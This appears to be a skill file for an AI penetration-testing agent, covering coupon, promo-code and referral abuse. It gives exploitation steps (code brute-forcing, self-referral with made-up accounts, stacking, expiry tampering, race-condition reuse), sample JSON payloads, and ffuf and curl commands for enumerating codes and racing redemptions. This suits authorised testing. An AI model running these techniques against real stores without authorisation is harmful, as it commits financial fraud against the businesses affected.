---
name: coupon-promo-abuse
description: Coupon, promo-code and referral abuse — coupon enumeration, stacking, self-referral, unlimited reuse, expiration bypass, and promo API manipulation. Use when the app has coupons, gift cards, referral programs, or promo credits.
category: business-logic
---

# Coupon / Promo / Referral Abuse

## Detection
- Find promo surfaces: `/coupon`, `/promo`, `/referral`, `/invite`, gift-card redeem, credit codes.
- Determine: is the code validated client-side? reusable? rate-limited? stackable? tied to account creation?

## Exploitation
1. **Code enumeration/brute**: short alpha codes (`SUMMER2026`, `WELCOME10`) → iterate wordlist; longer → fuzz per charset.
2. **Self-referral**: create accounts with unique emails (if permitted) → refer self → unlimited credits.
3. **Coupon stacking**: apply N coupons when app expects 1; parameter arrays `coupons[]=`.
4. **Reuse after expiry**: flip the `expiresAt` param in the request (if client controls it) or use old code after expiry.
5. **Quantity abuse**: redeem same code with race (parallel requests) or after mark-used (no server-side single-use flag).
6. **Gift card partial-use reset**: use code, then revert the redemption via another endpoint.

## Payloads
```
{"coupons":["WELCOME10","ADMIN20","FIRST50"]}
{"promo":{"code":"X","quantity":-1}}     # negative use
POST /coupon/redeem {"code":"X","amount":100,"_uses":0}
```

## Tool Commands
```powershell
# enumerate short codes with ffuf
ffuf -w codes.txt -u "$U/coupon/redeem" -X POST -d '{"code":"FUZZ"}' -H 'Content-Type: application/json' -mc 200
# race single-use
Start-Job { curl.exe -s "$U/coupon/redeem" -d '{"code":"X"}' } ; Start-Job { curl.exe -s "$U/coupon/redeem" -d '{"code":"X"}' }
```

## Verification & Evidence
- Proof = monetary credit gained beyond intended (multiple redemptions, stacking, self-referral credit).
- Redact account details; record exact abuse flow.